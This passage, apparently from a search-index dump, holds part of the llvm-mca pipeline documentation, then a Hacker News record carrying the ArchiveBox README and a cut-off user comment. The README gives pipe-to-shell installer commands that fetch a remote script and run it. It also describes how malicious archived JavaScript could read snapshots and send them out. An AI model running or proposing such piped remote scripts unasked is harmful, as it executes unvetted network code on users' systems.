availability, instructions that are dispatched to the scheduler are either placed into the WaitSet or into the ReadySet. Every cycle, the scheduler checks if instructions can be moved from the WaitSet to the ReadySet, and if instructions from the ReadySet can be issued to the underlying pipelines. The algorithm prioritizes older instructions over younger instructions. Write-Back and Retire Stage Issued instructions are moved from the ReadySet to the IssuedSet. There, instructions wait until they reach the write-back stage. At that point, they get removed from the queue and the retire control unit is notified. When instructions are executed, the retire control unit flags the instruction as ready to retire. Instructions are retired in program order. The register file is notified of the retirement so that it can free the physical registers that were allocated for the instruction during the register renaming stage. Load/Store Unit and Memory Consistency Model To simulate an out-of-order execution of memory operations, llvm-mca utilizes a simulated load/store unit (LSUnit) to simulate the speculative execution of loads and stores. Each load (or store) consumes an entry in the load (or store) queue. Users can specify flags -lqueue and -squeue to limit the number of entries in the load and store queues respectively. The queues are unbounded by default. The LSUnit implements a relaxed consistency model for memory loads and stores. The rules are: A younger load is allowed to pass an older load only if there are no intervening stores or barriers between the two loads. A younger load is allowed to pass an older store provided that the load does not alias with the store. A younger store is not allowed to pass an older store. A younger store is not allowed to pass an older load. By default, the LSUnit optimistically assumes that loads do not alias (-noalias=true) store operations. Under this assumption, younger loads are always allowed to pass older stores. Essentially, the LSUnit does not attempt to run any alias analysis to predict when loads and stores do not alias with each other. Note that, in the case of write-combining memory, rule 3 could be relaxed to allow reordering of non-aliasing store operations. That being said, at the moment, there is no way to further relax the memory model (-noalias is the only option). Essentially, there is no option to specify a different memory type (e.g., write-back, write-combining, write-through; etc.) and consequently to weaken, or strengthen, the memory model. Other limitations are: The LSUnit does not know when store-to-load forwarding may occur. The LSUnit does not know anything about cache hierarchy and memory types. The LSUnit does not know how to identify serializing operations and memory fences. The LSUnit does not attempt to predict if a load or store hits or misses the L1 cache. It only knows if an instruction MayLoad and/or MayStore. For loads, the scheduling model provides an optimistic load-to-use latency (which usually matches the load-to-use latency for when there is a hit in the L1D). llvm-mca does not know about serializing operations or memory-barrier like instructions. The LSUnit conservatively assumes that an instruction which has both MayLoad and unmodeled side effects behaves like a soft load-barrier. That means, it serializes loads without forcing a flush of the load queue. Similarly, instructions that MayStore and have unmodeled side effects are treated like store barriers. A full memory barrier is a MayLoad and MayStore instruction with unmodeled side effects. This is inaccurate, but it is the best that we can do at the moment with the current information available in LLVM. A load/store barrier consumes one entry of the load/store queue. A load/store barrier enforces ordering of loads/stores. A younger load cannot pass a load barrier. Also, a younger store cannot pass a store barrier. A younger load has to wait for the memory/load barrier to execute. A load/store barrier is executed when it becomes the oldest entry in the load/store queue(s). That also means, by construction, all of the older loads/stores have been executed. In conclusion, the full set of load/store consistency rules are: A store may not pass a previous store. A store may not pass a previous load (regardless of -noalias). A store has to wait until an older store barrier is fully executed. A load may pass a previous load. A load may not pass a previous store unless -noalias is set. A load has to wait until an older load barrier is fully executed. In-order Issue and Execute In-order processors are modelled as a single InOrderIssueStage stage. It bypasses Dispatch, Scheduler and Load/Store unit. Instructions are issued as soon as their operand registers are available and resource requirements are met. Multiple instructions can be issued in one cycle according to the value of the IssueWidth parameter in LLVMs scheduling model. Once issued, an instruction is moved to IssuedInst set until it is ready to retire. llvm-mca ensures that writes are committed in-order. However, an instruction is allowed to commit writes and retire out-of-order if RetireOOO property is true for at least one of its writes. Custom Behaviour Due to certain instructions not being expressed perfectly within their scheduling model, llvm-mca isnt always able to simulate them perfectly. Modifying the scheduling model isnt always a viable option though (maybe because the instruction is modeled incorrectly on purpose or the instructions behaviour is quite complex). The CustomBehaviour class can be used in these cases to enforce proper instruction modeling (often by customizing data dependencies and detecting hazards that llvm-mca has no way of knowing about). llvm-mca comes with one generic and multiple target specific CustomBehaviour classes. The generic class will be used if the -disable-cb flag is used or if a target specific CustomBehaviour class doesnt exist for that target. (The generic class does nothing.) Currently, the CustomBehaviour class is only a part of the in-order pipeline, but there are plans to add it to the out-of-order pipeline in the future. CustomBehaviours main method is checkCustomHazard() which uses the current instruction and a list of all instructions still executing within the pipeline to determine if the current instruction should be dispatched. As output, the method returns an integer representing the number of cycles that the current instruction must stall for (this can be an underestimate if you dont know the exact number and a value of 0 represents no stall). If youd like to add a CustomBehaviour class for a target that doesnt already have one, refer to an existing implementation to see how to set it up. The classes are implemented within the target specific backend (for example /llvm/lib/Target/AMDGPU/MCA/) so that they can access backend symbols. Custom Views llvm-mca comes with several Views such as the Timeline View and Summary View. These Views are generic and can work with most (if not all) targets. If you wish to add a new View to llvm-mca and it does not require any backend functionality that is not already exposed through MC layer classes (MCSubtargetInfo, MCInstrInfo, etc.), please add it to the /tools/llvm-mca/View/ directory. However, if your new View is target specific AND requires unexposed backend symbols or functionality, you can define it in the /lib/Target/<TargetName>/MCA/ directory. To enable this target specific View, you will have to use this targets CustomBehaviour class to override the CustomBehaviour::getViews() methods. There are 3 variations of these methods based on where you want your View to appear in the output: getStartViews(), getPostInstrInfoViews(), and getEndViews(). These methods returns a vector of Views so you will want to return a vector containing all of the target specific Views for the target in question. Because these target specific (and backend dependent) Views require the CustomBehaviour::getViews() variants, these Views will not be enabled if the -disable-cb flag is used. Enabling these custom Views does not affect the non-custom (generic) Views. Continue to use the usual command line arguments to enable / disable those Views. ",
        "_version_": 1718527402945019904
      },
      {
        "story_id": [19346985],
        "story_author": ["based2"],
        "story_descendants": [59],
        "story_score": [381],
        "story_time": ["2019-03-09T16:48:31Z"],
        "story_title": "ArchiveBox: Open-source self-hosted web archive",
        "search": [
          "ArchiveBox: Open-source self-hosted web archive",
          "https://github.com/pirate/ArchiveBox",
          "ArchiveBox is a powerful, self-hosted internet archiving solution to collect, save, and view sites you want to preserve offline. You can set it up as a command-line tool, web app, and desktop app (alpha), on Linux, macOS, and Windows. You can feed it URLs one at a time, or schedule regular imports from browser bookmarks or history, feeds like RSS, bookmark services like Pocket/Pinboard, and more. See input formats for a full list. It saves snapshots of the URLs you feed it in several formats: HTML, PDF, PNG screenshots, WARC, and more out-of-the-box, with a wide variety of content extracted and preserved automatically (article text, audio/video, git repos, etc.). See output formats for a full list. The goal is to sleep soundly knowing the part of the internet you care about will be automatically preserved in durable, easily accessible formats for decades after it goes down. Demo | Screenshots | Usage . . . . . . . . . . . . . . . . . . . . . . . . . . . . Get ArchiveBox with Docker / apt / brew / pip3 / etc. (see Quickstart below). # Follow the instructions for your package manager in the quickstart, e.g.: pip3 install archivebox # Or use the optional auto setup script to install it for you: curl -sSL 'https://get.archivebox.io' | sh Example usage: adding links to archive. archivebox add 'https://example.com' # add URLs one at a time via args / piped stdin archivebox schedule --every=day --depth=1 https://example.com/rss.xml # or have it import URLs regularly on a schedule Example usage: viewing the archived content. archivebox server 0.0.0.0:8000 # use the interactive web UI archivebox list 'https://example.com' # use the CLI commands (--help for more) ls ./archive/*/index.json # or browse directly via the filesystem Key Features Free & open source, doesn't require signing up for anything, stores all data locally Powerful, intuitive command line interface with modular optional dependencies Comprehensive documentation, active development, and rich community Extracts a wide variety of content out-of-the-box: media (youtube-dl), articles (readability), code (git), etc. Supports scheduled/realtime importing from many types of sources Uses standard, durable, long-term formats like HTML, JSON, PDF, PNG, and WARC Usable as a oneshot CLI, self-hosted web UI, Python API (BETA), REST API (ALPHA), or desktop app (ALPHA) Saves all pages to archive.org as well by default for redundancy (can be disabled for local-only mode) Planned: support for archiving content requiring a login/paywall/cookies (working, but ill-advised until some pending fixes are released) Planned: support for running JS during archiving to adblock, autoscroll, modal-hide, thread-expand... Quickstart Supported OSs: Linux/BSD, macOS, Windows (Docker/WSL) CPUs: amd64, x86, arm8, arm7 (raspi>=3) Easy Setup docker-compose (macOS/Linux/Windows) recommended (click to expand) Docker Compose is recommended for the easiest install/update UX + best security + all the extras working out-of-the-box. Install Docker and Docker Compose on your system (if not already installed). Download the docker-compose.yml file into a new empty directory (can be anywhere). mkdir ~/archivebox && cd ~/archivebox curl -O 'https://raw.githubusercontent.com/ArchiveBox/ArchiveBox/master/docker-compose.yml' Run the initial setup and create an admin user. docker-compose run archivebox init --setup Optional: Start the server then login to the Web UI http://127.0.0.1:8000 Admin. docker-compose up # completely optional, CLI can always be used without running a server # docker-compose run [-T] archivebox [subcommand] [--args] See below for more usage examples using the CLI, Web UI, or filesystem/SQL/Python to manage your archive. docker (macOS/Linux/Windows) Install Docker on your system (if not already installed). Create a new empty directory and initalize your collection (can be anywhere). mkdir ~/archivebox && cd ~/archivebox docker run -v $PWD:/data -it archivebox/archivebox init --setup Optional: Start the server then login to the Web UI http://127.0.0.1:8000 Admin. docker run -v $PWD:/data -p 8000:8000 archivebox/archivebox # completely optional, CLI can always be used without running a server # docker run -v $PWD:/data -it [subcommand] [--args] See below for more usage examples using the CLI, Web UI, or filesystem/SQL/Python to manage your archive. bash auto-setup script (macOS/Linux) Install Docker on your system (optional, highly recommended but not required). Run the automatic setup script. curl -sSL 'https://get.archivebox.io' | sh See below for more usage examples using the CLI, Web UI, or filesystem/SQL/Python to manage your archive. See setup.sh for the source code of the auto-install script. Manual Setup apt (Ubuntu/Debian) Add the ArchiveBox repository to your sources. # On Ubuntu == 20.04, add the sources automatically: sudo apt install software-properties-common sudo add-apt-repository -u ppa:archivebox/archivebox # On Ubuntu >= 20.10 or <= 19.10, or other Debian-style systems, add the sources manually: echo \"deb http://ppa.launchpad.net/archivebox/archivebox/ubuntu focal main\" | sudo tee /etc/apt/sources.list.d/archivebox.list sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys C258F79DCC02E369 sudo apt update Install the ArchiveBox package using apt. sudo apt install archivebox sudo python3 -m pip install --upgrade --ignore-installed archivebox # pip needed because apt only provides a broken older version of Django Create a new empty directory and initalize your collection (can be anywhere). mkdir ~/archivebox && cd ~/archivebox archivebox init --setup # if any problems, install with pip instead Optional: Start the server then login to the Web UI http://127.0.0.1:8000 Admin. archivebox server 0.0.0.0:8000 # completely optional, CLI can always be used without running a server # archivebox [subcommand] [--args] See below for more usage examples using the CLI, Web UI, or filesystem/SQL/Python to manage your archive. See the debian-archivebox repo for more details about this distribution. brew (macOS) Install Homebrew on your system (if not already installed). Install the ArchiveBox package using brew. brew tap archivebox/archivebox brew install archivebox Create a new empty directory and initalize your collection (can be anywhere). mkdir ~/archivebox && cd ~/archivebox archivebox init --setup # if any problems, install with pip instead Optional: Start the server then login to the Web UI http://127.0.0.1:8000 Admin. archivebox server 0.0.0.0:8000 # completely optional, CLI can always be used without running a server # archivebox [subcommand] [--args] See below for more usage examples using the CLI, Web UI, or filesystem/SQL/Python to manage your archive. See the homebrew-archivebox repo for more details about this distribution. pip (macOS/Linux/Windows) Install Python >= v3.7 and Node >= v14 on your system (if not already installed). Install the ArchiveBox package using pip3. Create a new empty directory and initalize your collection (can be anywhere). mkdir ~/archivebox && cd ~/archivebox archivebox init --setup # install any missing extras like wget/git/ripgrep/etc. manually as needed Optional: Start the server then login to the Web UI http://127.0.0.1:8000 Admin. archivebox server 0.0.0.0:8000 # completely optional, CLI can always be used without running a server # archivebox [subcommand] [--args] See below for more usage examples using the CLI, Web UI, or filesystem/SQL/Python to manage your archive. See the pip-archivebox repo for more details about this distribution. pacman / pkg / nix (Arch/FreeBSD/NixOS/more) Arch: pacman install archivebox (contributed by @imlonghao) FreeBSD: curl -sSL 'https://get.archivebox.io' | sh (uses pkg + pip3 under-the-hood) Nix: nix-env --install archivebox (contributed by @siraben) More: contribute another distribution...! See below for usage examples using the CLI, Web UI, or filesystem/SQL/Python to manage your archive. Other Options docker + electron Desktop App (macOS/Linux/Windows) Install Docker on your system (if not already installed). Download a binary release for your OS or build the native app from source macOS: ArchiveBox.app.zip Linux: ArchiveBox.deb (alpha: build manually) Windows: ArchiveBox.exe (beta: build manually) Alpha (contributors wanted!): for more info, see the: Electron ArchiveBox repo. Paid hosting solutions (cloud VPS) For more discussion on managed and paid hosting options see here: Issue #531. Next Steps Import URLs from some of the supported Input Formats or view the supported Output Formats... Tweak your UI or archiving behavior Configuration or read about some of the Caveats and troubleshooting steps... Read about the Dependencies used for archiving or the Archive Layout on disk... Or check out our full Documentation or Community Wiki... Usage CLI Usage # archivebox [subcommand] [--args] # docker-compose run archivebox [subcommand] [--args] # docker run -v $PWD:/data -it [subcommand] [--args] archivebox init --setup # safe to run init multiple times (also how you update versions) archivebox --version archivebox help archivebox setup/init/config/status/manage to administer your collection archivebox add/schedule/remove/update/list/shell/oneshot to manage Snapshots in the archive archivebox schedule to pull in fresh URLs in regularly from boorkmarks/history/Pocket/Pinboard/RSS/etc. Web UI Usage archivebox manage createsuperuser # set an admin password archivebox server 0.0.0.0:8000 # open http://127.0.0.1:8000 to view it # you can also configure whether or not login is required for most features archivebox config --set PUBLIC_INDEX=False archivebox config --set PUBLIC_SNAPSHOTS=False archivebox config --set PUBLIC_ADD_VIEW=False SQL/Python/Filesystem Usage sqlite3 ./index.sqlite3 # run SQL queries on your index archivebox shell # explore the Python API in a REPL ls ./archive/*/index.html # or inspect snapshots on the filesystem Overview Input Formats ArchiveBox supports many input formats for URLs, including Pocket & Pinboard exports, Browser bookmarks, Browser history, plain text, HTML, markdown, and more! Click these links for instructions on how to prepare your links from these sources: TXT, RSS, XML, JSON, CSV, SQL, HTML, Markdown, or any other text-based format... Browser history or browser bookmarks (see instructions for: Chrome, Firefox, Safari, IE, Opera, and more...) Pocket, Pinboard, Instapaper, Shaarli, Delicious, Reddit Saved, Wallabag, Unmark.it, OneTab, and more... # archivebox add --help archivebox add 'https://example.com/some/page' archivebox add < ~/Downloads/firefox_bookmarks_export.html archivebox add --depth=1 'https://news.ycombinator.com#2020-12-12' echo 'http://example.com' | archivebox add echo 'any_text_with [urls](https://example.com) in it' | archivebox add # if using docker add -i when piping stdin: # echo 'https://example.com' | docker run -v $PWD:/data -i archivebox/archivebox add # if using docker-compose add -T when piping stdin / stdout: # echo 'https://example.com' | docker-compose run -T archivebox add See the Usage: CLI page for documentation and examples. It also includes a built-in scheduled import feature with archivebox schedule and browser bookmarklet, so you can pull in URLs from RSS feeds, websites, or the filesystem regularly/on-demand. Output Formats Inside each Snapshot folder, ArchiveBox save these different types of extractor outputs as plain files: ./archive/<timestamp>/* Index: index.html & index.json HTML and JSON index files containing metadata and details Title, Favicon, Headers Response headers, site favicon, and parsed site title SingleFile: singlefile.html HTML snapshot rendered with headless Chrome using SingleFile Wget Clone: example.com/page-name.html wget clone of the site with warc/<timestamp>.gz Chrome Headless PDF: output.pdf Printed PDF of site using headless chrome Screenshot: screenshot.png 1440x900 screenshot of site using headless chrome DOM Dump: output.html DOM Dump of the HTML after rendering using headless chrome Article Text: article.html/json Article text extraction using Readability & Mercury Archive.org Permalink: archive.org.txt A link to the saved site on archive.org Audio & Video: media/ all audio/video files + playlists, including subtitles & metadata with youtube-dl Source Code: git/ clone of any repository found on GitHub, Bitbucket, or GitLab links More coming soon! See the Roadmap... It does everything out-of-the-box by default, but you can disable or tweak individual archive methods via environment variables / config. Configuration ArchiveBox can be configured via environment variables, by using the archivebox config CLI, or by editing the ArchiveBox.conf config file directly. archivebox config # view the entire config archivebox config --get CHROME_BINARY # view a specific value archivebox config --set CHROME_BINARY=chromium # persist a config using CLI # OR echo CHROME_BINARY=chromium >> ArchiveBox.conf # persist a config using file # OR env CHROME_BINARY=chromium archivebox ... # run with a one-off config These methods also work the same way when run inside Docker, see the Docker Configuration wiki page for details. The config loading logic with all the options defined is here: archivebox/config.py. Most options are also documented on the Configuration Wiki page. Most Common Options to Tweak # e.g. archivebox config --set TIMEOUT=120 TIMEOUT=120 # default: 60 add more seconds on slower networks CHECK_SSL_VALIDITY=True # default: False True = allow saving URLs w/ bad SSL SAVE_ARCHIVE_DOT_ORG=False # default: True False = disable Archive.org saving MAX_MEDIA_SIZE=1500m # default: 750m raise/lower youtubedl output size PUBLIC_INDEX=True # default: True whether anon users can view index PUBLIC_SNAPSHOTS=True # default: True whether anon users can view pages PUBLIC_ADD_VIEW=False # default: False whether anon users can add new URLs Dependencies For better security, easier updating, and to avoid polluting your host system with extra dependencies, it is strongly recommended to use the official Docker image with everything pre-installed for the best experience. To achieve high fidelity archives in as many situations as possible, ArchiveBox depends on a variety of 3rd-party tools and libraries that specialize in extracting different types of content. These optional dependencies used for archiving sites include: chromium / chrome (for screenshots, PDF, DOM HTML, and headless JS scripts) node & npm (for readability, mercury, and singlefile) wget (for plain HTML, static files, and WARC saving) curl (for fetching headers, favicon, and posting to Archive.org) youtube-dl (for audio, video, and subtitles) git (for cloning git repos) and more as we grow... You don't need to install every dependency to use ArchiveBox. ArchiveBox will automatically disable extractors that rely on dependencies that aren't installed, based on what is configured and available in your $PATH. If not using Docker, make sure to keep the dependencies up-to-date yourself and check that ArchiveBox isn't reporting any incompatibility with the versions you install. # install python3 and archivebox with your system package manager # apt/brew/pip/etc install ... (see Quickstart instructions above) archivebox setup # auto install all the extractors and extras archivebox --version # see info and check validity of installed dependencies Installing directly on Windows without Docker or WSL/WSL2/Cygwin is not officially supported, but some advanced users have reported getting it working. Archive Layout All of ArchiveBox's state (including the index, snapshot data, and config file) is stored in a single folder called the \"ArchiveBox data folder\". All archivebox CLI commands must be run from inside this folder, and you first create it by running archivebox init. The on-disk layout is optimized to be easy to browse by hand and durable long-term. The main index is a standard index.sqlite3 database in the root of the data folder (it can also be exported as static JSON/HTML), and the archive snapshots are organized by date-added timestamp in the ./archive/ subfolder. ./ index.sqlite3 ArchiveBox.conf archive/ ... 1617687755/ index.html index.json screenshot.png media/some_video.mp4 warc/1617687755.warc.gz git/somerepo.git ... Each snapshot subfolder ./archive/<timestamp>/ includes a static index.json and index.html describing its contents, and the snapshot extractor outputs are plain files within the folder. Static Archive Exporting You can export the main index to browse it statically without needing to run a server. Note about large exports: These exports are not paginated, exporting many URLs or the entire archive at once may be slow. Use the filtering CLI flags on the archivebox list command to export specific Snapshots or ranges. # archivebox list --help archivebox list --html --with-headers > index.html # export to static html table archivebox list --json --with-headers > index.json # export to json blob archivebox list --csv=timestamp,url,title > index.csv # export to csv spreadsheet # (if using docker-compose, add the -T flag when piping) # docker-compose run -T archivebox list --html --filter-type=search snozzberries > index.json The paths in the static exports are relative, make sure to keep them next to your ./archive folder when backing them up or viewing them. Caveats Archiving Private Content If you're importing pages with private content or URLs containing secret tokens you don't want public (e.g Google Docs, paywalled content, unlisted videos, etc.), you may want to disable some of the extractor methods to avoid leaking that content to 3rd party APIs or the public. # don't save private content to ArchiveBox, e.g.: archivebox add 'https://docs.google.com/document/d/12345somePrivateDocument' archivebox add 'https://vimeo.com/somePrivateVideo' # without first disabling saving to Archive.org: archivebox config --set SAVE_ARCHIVE_DOT_ORG=False # disable saving all URLs in Archive.org # restrict the main index, snapshot content, and add form to authenticated in users as needed: archivebox config --set PUBLIC_INDEX=False archivebox config --set PUBLIC_SNAPSHOTS=False archivebox config --set PUBLIC_ADD_VIEW=False # if extra paranoid or anti-Google: archivebox config --set SAVE_FAVICON=False # disable favicon fetching (it calls a Google API passing the URL's domain part only) archivebox config --set CHROME_BINARY=chromium # ensure it's using Chromium instead of Chrome Security Risks of Viewing Archived JS Be aware that malicious archived JS can access the contents of other pages in your archive when viewed. Because the Web UI serves all viewed snapshots from a single domain, they share a request context and typical CSRF/CORS/XSS/CSP protections do not work to prevent cross-site request attacks. See the Security Overview page and Issue #239 for more details. # visiting an archived page with malicious JS: https://127.0.0.1:8000/archive/1602401954/example.com/index.html # example.com/index.js can now make a request to read everything from: https://127.0.0.1:8000/index.html https://127.0.0.1:8000/archive/* # then example.com/index.js can send it off to some evil server The admin UI is also served from the same origin as replayed JS, so malicious pages could also potentially use your ArchiveBox login cookies to perform admin actions (e.g. adding/removing links, running extractors, etc.). We are planning to fix this security shortcoming in a future version by using separate ports/origins to serve the Admin UI and archived content (see Issue #239). Note: Only the wget extractor method executes archived JS when viewing snapshots, all other archive methods produce static output that does not execute JS on viewing. If you are worried about these issues ^ you should disable the wget extractor method using archivebox config --set SAVE_WGET=False. Saving Multiple Snapshots of a Single URL First-class support for saving multiple snapshots of each site over time will be added eventually (along with the ability to view diffs of the changes between runs). For now ArchiveBox is designed to only archive each unique URL with each extractor type once. The workaround to take multiple snapshots of the same URL is to make them slightly different by adding a hash: archivebox add 'https://example.com#2020-10-24' ... archivebox add 'https://example.com#2020-10-25' The button in the Admin UI is a shortcut for this hash-date workaround. Storage Requirements Because ArchiveBox is designed to ingest a firehose of browser history and bookmark feeds to a local disk, it can be much more disk-space intensive than a centralized service like the Internet Archive or Archive.today. ArchiveBox can use anywhere from ~1gb per 1000 articles, to ~50gb per 1000 articles, mostly dependent on whether you're saving audio & video using SAVE_MEDIA=True and whether you lower MEDIA_MAX_SIZE=750mb. Disk usage can be reduced by using a compressed/deduplicated filesystem like ZFS/BTRFS, or by turning off extractors methods you don't need. Don't store large collections on older filesystems like EXT3/FAT as they may not be able to handle more than 50k directory entries in the archive/ folder. Try to keep the index.sqlite3 file on local drive (not a network mount) or SSD for maximum performance, however the archive/ folder can be on a network mount or spinning HDD. Screenshots Background & Motivation The aim of ArchiveBox is to enable more of the internet to be archived by empowering people to self-host their own archives. The intent is for all the web content you care about to be viewable with common software in 50 - 100 years without needing to run ArchiveBox or other specialized software to replay it. Vast treasure troves of knowledge are lost every day on the internet to link rot. As a society, we have an imperative to preserve some important parts of that treasure, just like we preserve our books, paintings, and music in physical libraries long after the originals go out of print or fade into obscurity. Whether it's to resist censorship by saving articles before they get taken down or edited, or just to save a collection of early 2010's flash games you love to play, having the tools to archive internet content enables to you save the stuff you care most about before it disappears. The balance between the permanence and ephemeral nature of content on the internet is part of what makes it beautiful. I don't think everything should be preserved in an automated fashion--making all content permanent and never removable, but I do think people should be able to decide for themselves and effectively archive specific content that they care about. Because modern websites are complicated and often rely on dynamic content, ArchiveBox archives the sites in several different formats beyond what public archiving services like Archive.org/Archive.is save. Using multiple methods and the market-dominant browser to execute JS ensures we can save even the most complex, finicky websites in at least a few high-quality, long-term data formats. Comparison to Other Projects Check out our community page for an index of web archiving initiatives and projects. A variety of open and closed-source archiving projects exist, but few provide a nice UI and CLI to manage a large, high-fidelity archive collection over time. ArchiveBox tries to be a robust, set-and-forget archiving solution suitable for archiving RSS feeds, bookmarks, or your entire browsing history (beware, it may be too big to store), including private/authenticated content that you wouldn't otherwise share with a centralized service (this is not recommended due to JS replay security concerns). Comparison With Centralized Public Archives Not all content is suitable to be archived in a centralized collection, whether because it's private, copyrighted, too large, or too complex. ArchiveBox hopes to fill that gap. By having each user store their own content locally, we can save much larger portions of everyone's browsing history than a shared centralized service would be able to handle. The eventual goal is to work towards federated archiving where users can share portions of their collections with each other. Comparison With Other Self-Hosted Archiving Options ArchiveBox differentiates itself from similar self-hosted projects by providing both a comprehensive CLI interface for managing your archive, a Web UI that can be used either independently or together with the CLI, and a simple on-disk data format that can be used without either. ArchiveBox is neither the highest fidelity, nor the simplest tool available for self-hosted archiving, rather it's a jack-of-all-trades that tries to do most things well by default. It can be as simple or advanced as you want, and is designed to do everything out-of-the-box but be tuned to suit your needs. If you want better fidelity for very complex interactive pages with heavy JS/streams/API requests, check out ArchiveWeb.page and ReplayWeb.page. If you want more bookmark categorization and note-taking features, check out Archivy, Memex, Polar, or LinkAce. If you need more advanced recursive spider/crawling ability beyond --depth=1, check out Browsertrix, Photon, or Scrapy and pipe the outputted URLs into ArchiveBox. For more alternatives, see our list here... Internet Archiving Ecosystem Whether you want to learn which organizations are the big players in the web archiving space, want to find a specific open-source tool for your web archiving need, or just want to see where archivists hang out online, our Community Wiki page serves as an index of the broader web archiving community. Check it out to learn about some of the coolest web archiving projects and communities on the web! Community Wiki The Master Lists Community-maintained indexes of archiving tools and institutions. Web Archiving Software Open source tools and projects in the internet archiving space. Reading List Articles, posts, and blogs relevant to ArchiveBox and web archiving in general. Communities A collection of the most active internet archiving communities and initiatives. Check out the ArchiveBox Roadmap and Changelog Learn why archiving the internet is important by reading the \"On the Importance of Web Archiving\" blog post. Reach out to me for questions and comments via @ArchiveBoxApp or @theSquashSH on Twitter Need help building a custom archiving solution? Hire the team that helps build Archivebox to work on your project. (@MonadicalSAS) (They also do general software consulting across many industries) Documentation We use the GitHub wiki system and Read the Docs (WIP) for documentation. You can also access the docs locally by looking in the ArchiveBox/docs/ folder. Getting Started Quickstart Install Docker Reference Usage Configuration Supported Sources Supported Outputs Scheduled Archiving Publishing Your Archive Chromium Install Security Overview Troubleshooting Python API (alpha) REST API (alpha) More Info Tickets Roadmap Changelog Donations Background & Motivation Web Archiving Community ArchiveBox Development All contributions to ArchiveBox are welcomed! Check our issues and Roadmap for things to work on, and please open an issue to discuss your proposed implementation before working on things! Otherwise we may have to close your PR if it doesn't align with our roadmap. Low hanging fruit / easy first tickets: Setup the dev environment Click to expand... 1. Clone the main code repo (making sure to pull the submodules as well) git clone --recurse-submodules https://github.com/ArchiveBox/ArchiveBox cd ArchiveBox git checkout dev # or the branch you want to test git submodule update --init --recursive git pull --recurse-submodules 2. Option A: Install the Python, JS, and system dependencies directly on your machine # Install ArchiveBox + python dependencies python3 -m venv .venv && source .venv/bin/activate && pip install -e '.[dev]' # or: pipenv install --dev && pipenv shell # Install node dependencies npm install # or archivebox setup # Check to see if anything is missing archivebox --version # install any missing dependencies manually, or use the helper script: ./bin/setup.sh 2. Option B: Build the docker container and use that for development instead # Optional: develop via docker by mounting the code dir into the container # if you edit e.g. ./archivebox/core/models.py on the docker host, runserver # inside the container will reload and pick up your changes docker build . -t archivebox docker run -it \\ -v $PWD/data:/data \\ archivebox init --setup docker run -it -p 8000:8000 \\ -v $PWD/data:/data \\ -v $PWD/archivebox:/app/archivebox \\ archivebox server 0.0.0.0:8000 --debug --reload # (remove the --reload flag and add the --nothreading flag when profiling with the django debug toolbar) Common development tasks See the ./bin/ folder and read the source of the bash scripts within. You can also run all these in Docker. For more examples see the GitHub Actions CI/CD tests that are run: .github/workflows/*.yaml. Run in DEBUG mode Click to expand... archivebox config --set DEBUG=True # or archivebox server --debug ... Install and run a specific GitHub branch Click to expand... # docker: docker build -t archivebox:dev https://github.com/ArchiveBox/ArchiveBox.git#dev docker run -it -v $PWD:/data archivebox:dev init --setup # bare metal: pip install 'git+https://github.com/pirate/ArchiveBox@dev' npm install 'git+https://github.com/ArchiveBox/ArchiveBox.git#dev' archivebox init --setup Run the linters Click to expand... (uses flake8 and mypy) Run the integration tests Click to expand... (uses pytest -s) Make migrations or enter a django shell Click to expand... Make sure to run this whenever you change things in models.py. cd archivebox/ ./manage.py makemigrations cd path/to/test/data/ archivebox shell archivebox manage dbshell (uses pytest -s) Contributing a new extractor Click to expand...ArchiveBox extractors are external binaries or Python/Node scripts that ArchiveBox runs to archive content on a page. Extractors take the URL of a page to archive, write their output to the filesystem archive/<timestamp>/<extractorname>/..., and return an ArchiveResult entry which is saved to the database (visible on the Log page in the UI). Check out how we added archivebox/extractors/singlefile.py as an example of the process: Issue #399 + PR #403. The process to contribute a new extractor is like this: Open an issue with your propsoed implementation (please link to the pages of any new external dependencies you plan on using) Ensure any dependencies needed are easily installable via a package managers like apt, brew, pip3, npm (Ideally, prefer to use external programs available via pip3 or npm, however we do support using any binary installable via package manager that exposes a CLI/Python API and writes output to stdout or the filesystem.) Create a new file in archivebox/extractors/<extractorname>.py (copy an existing extractor like singlefile.py as a template) Add config settings to enable/disable any new dependencies and the extractor as a whole, e.g. USE_DEPENDENCYNAME, SAVE_EXTRACTORNAME, EXTRACTORNAME_SOMEOTHEROPTION in archivebox/config.py Add a preview section to archivebox/templates/core/snapshot.html to view the output, and a column to archivebox/templates/core/index_row.html with an icon for your extractor Add an integration test for your extractor in tests/test_extractors.py Submit your PR for review! Once merged, please document it in these places and anywhere else you see info about other extractors: https://github.com/ArchiveBox/ArchiveBox#output-formats https://github.com/ArchiveBox/ArchiveBox/wiki/Configuration#archive-method-toggles https://github.com/ArchiveBox/ArchiveBox/wiki/Install#dependencies Build the docs, pip package, and docker image Click to expand... (Normally CI takes care of this, but these scripts can be run to do it manually) ./bin/build.sh # or individually: ./bin/build_docs.sh ./bin/build_pip.sh ./bin/build_deb.sh ./bin/build_brew.sh ./bin/build_docker.sh Roll a release Click to expand... (Normally CI takes care of this, but these scripts can be run to do it manually) ./bin/release.sh # or individually: ./bin/release_docs.sh ./bin/release_pip.sh ./bin/release_deb.sh ./bin/release_brew.sh ./bin/release_docker.sh Further Reading Home: ArchiveBox.io Demo: Demo.ArchiveBox.io Docs: Docs.ArchiveBox.io Releases: Github.com/ArchiveBox/ArchiveBox/releases Wiki: Github.com/ArchiveBox/ArchiveBox/wiki Issues: Github.com/ArchiveBox/ArchiveBox/issues Forum: Github.com/ArchiveBox/ArchiveBox/discussions Donations: Github.com/ArchiveBox/ArchiveBox/wiki/Donations ",
          "I actually talked to the author of ArchiveBox about 1-2 weeks ago. Nice guy and it's good that he's also friendly with the Internet Archive.<p>ArchiveBox uses WARC as it's backing store:<p><a href=\"https://en.wikipedia.org/wiki/Web_ARChive\" rel=\"nofollow\">https://en.wikipedia.org/wiki/Web_ARChive</a><p>which is nice because it's standardized.<p>We were discussing integrating Polar web archives along with ArchiveBox and maybe having some sort of standard to automatically submit these WARCs to the Internet Archive as part of your normal browsing activity.<p>Polar has a similar web capture feature but it's not WARC<p><a href=\"https://getpolarized.io/\" rel=\"nofollow\">https://getpolarized.io/</a><p>(yet)...<p>WARC is probably the easiest standard for Polar to adopt.  Right now we use HTML encoded in JSON objects.<p>When the user captures a web page we save all resources and store them in a PHZ file which you can keep as your own personal web archive.<p>What I'd like to eventually do is update our extension to auto-capture web pages so you could use Polar's cloud storage feature to basically store every page you've ever visited.<p>It really wouldn't be that much money per year. I did the math and it's about $50 per year to store your entire web history.<p>If I can get Polar over to WARC that would mean that tools like ArchiveBox and Polar could interop but we could do things like automatically send your documents you browse to the Internet Archive.<p>There's one huge problem though. What do we do about cookies and private data.  I'm really 